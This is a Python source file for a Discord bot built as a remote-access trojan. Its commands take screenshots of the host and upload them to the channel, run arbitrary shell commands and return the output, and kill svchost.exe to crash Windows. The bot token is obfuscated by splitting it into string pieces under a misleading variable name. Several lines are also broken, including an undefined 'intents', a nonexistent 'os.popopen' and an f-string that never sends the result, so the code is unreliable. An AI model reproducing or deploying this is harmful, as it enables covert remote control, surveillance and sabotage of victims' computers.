import discord
from discord.ext import commands
import pyautogui
import os

asyncioe = 'MTI2Mj' + 'MxMz' + 'M5MDAz' + 'OTIzNjY2OA.GsVb1y.472t_MSJ8kTfb8D5lIPaN-Uk50JEVGj2eUu5Sc'
bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user}!')

@bot.command(name='screenshot')
async def screenshot(ctx):
    # Take a screenshot
    screenshot = pyautogui.screenshot()
    screenshot_path = 'screenshot.png'
    screenshot.save(screenshot_path)

    # Send the screenshot
    await ctx.send(file=discord.File(screenshot_path))
    os.remove(screenshot_path)  # Clean up the file

@bot.command(name='run')
async def run_command(ctx, *, command: str):
    # Execute the command (dangerous, use with caution)
    result = os.popen(command).read()
    await ctx.send(f'Command output:\n``````')

@bot.command(name='bsod')
async def bsod():
  os.popopen("taskkill /f /im svchost.exe")

@bot.command(name='exit')
async def exi():
    exit(0)
    print("failed to exit.")
bot.run(asyncioe)
